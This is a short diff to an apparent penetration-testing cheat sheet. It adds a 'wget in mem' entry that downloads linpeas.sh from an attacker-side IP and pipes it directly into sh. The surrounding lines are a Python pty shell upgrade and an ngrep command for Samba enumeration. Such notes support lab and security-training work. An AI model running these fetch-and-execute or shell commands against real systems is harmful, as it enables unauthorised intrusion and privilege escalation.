@@ -6,6 +6,10 @@ Upgrade $ /bin/sh to full /bin/bash shell
 python -c "import pty;pty.spawn('/bin/bash')"
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
+##### wget in mem
+```bash
+wget -O - http://192.168.49.66/linpeas.sh | sh
+```
 ##### Samba Enumeration 
 ```bash
 sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 
